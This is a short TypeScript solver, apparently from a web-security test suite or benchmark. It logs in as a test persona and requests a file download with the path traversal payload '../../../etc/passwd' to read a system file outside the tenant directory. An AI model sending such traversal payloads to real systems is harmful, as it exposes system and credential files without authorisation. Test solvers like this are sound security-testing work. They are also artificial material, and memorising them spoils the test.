// Path traversal in file download: request a relative path that climbs out of the tenant jail to a
// system file.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  await ctx.fetch(ctx.path('downloadFile', {}, { filePath: '../../../etc/passwd' }), { session: owner })
}
